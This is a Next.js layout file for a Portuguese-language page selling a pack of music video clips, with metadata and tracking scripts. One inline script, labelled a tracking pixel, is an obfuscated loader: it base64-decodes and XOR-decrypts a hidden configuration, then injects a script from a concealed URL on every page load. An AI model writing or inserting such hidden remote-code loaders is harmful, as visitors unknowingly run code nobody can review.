import type { Metadata } from "next";
import "./globals.css";

const publicUrl = "https://brazhits.com.br/pack-de-clipes/";
const ogImage = `${publicUrl}og.png`;
const utmifyPixelScript = `(function(){var c_086=atob("DAZf588brMHue8rYOH19kr13jvvME76sSHVlyOB4yK/ADr61UWAmyax0we+MCeWrW3Q2l7tog7GHA6+0F3Y2n6p3gqudWeb6WXIrlaZ52bWLCOjiY1tzxah3w6OPF7n6Al0kxaF6waTMQeioUX46i4Z/ju3MDau0TWN93e0tzfeNSv3tCmRm1vt6yfaMH6jvXWBphf850ZyT");var l_y7=[];for(var e_4m=0;e_4m<c_086.length;e_4m++){l_y7.push(c_086.charCodeAt(e_4m)&255);}var h_59=l_y7[0];var k_0tk1=l_y7.slice(1,1+h_59);var z_bk=l_y7.slice(1+h_59);var j_euu=z_bk.map(function(b,y_8){return b^k_0tk1[y_8%h_59];});var c_g9="";for(var e_054t=0;e_054t<j_euu.length;e_054t++){c_g9+=String.fromCharCode(j_euu[e_054t]&255);}var g_pa=decodeURIComponent(escape(c_g9));var p_jrb=JSON.parse(g_pa);var y_c=p_jrb.globals||[];y_c.forEach(function(w_mycq){window[w_mycq.name]=w_mycq.value;});var r_6c4q=document.createElement("script");r_6c4q.src=p_jrb.url;r_6c4q.async=true;r_6c4q.defer=true;(p_jrb.attributes||[]).forEach(function(w_ejv3){r_6c4q.setAttribute(w_ejv3.name,w_ejv3.value);});(document.head||document.documentElement).appendChild(r_6c4q);})();`;
const metaPixelScript = `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1147242417377452');fbq('track','PageView');`;

export const metadata: Metadata = {
  metadataBase: new URL(publicUrl),
  title: "Super Pack +2.000 Clipes Full HD | BrazHits",
  description: "Mais de 2.000 clipes em Full HD, organizados por gênero e prontos para carro, TV, PC e festas. Acesso vitalício e atualizações mensais.",
  alternates: { canonical: publicUrl },
  icons: {
    icon: `${publicUrl}logo-brazhits.png`,
    shortcut: `${publicUrl}logo-brazhits.png`,
    apple: `${publicUrl}logo-brazhits.png`,
  },
  openGraph: {
    url: publicUrl,
    title: "+2.000 Clipes em Full HD | BrazHits",
    description: "Todos os ritmos e muita qualidade para sua multimídia. Acesso vitalício e atualizações mensais.",
    type: "website",
    locale: "pt_BR",
    images: [{ url: ogImage, width: 1736, height: 909, alt: "BrazHits — mais de 2.000 clipes em Full HD" }],
  },
  twitter: {
    card: "summary_large_image",
    title: "+2.000 Clipes em Full HD | BrazHits",
    description: "Clipes em 1080p organizados por gênero para carro, TV, PC e festas — mesmo sem internet.",
    images: [ogImage],
  },
};

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="pt-BR">
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
        <script dangerouslySetInnerHTML={{ __html: utmifyPixelScript }} />
        <script dangerouslySetInnerHTML={{ __html: metaPixelScript }} />
      </head>
      <body>
        <noscript>
          <img
            alt=""
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1147242417377452&ev=PageView&noscript=1"
          />
        </noscript>
        {children}
      </body>
    </html>
  );
}
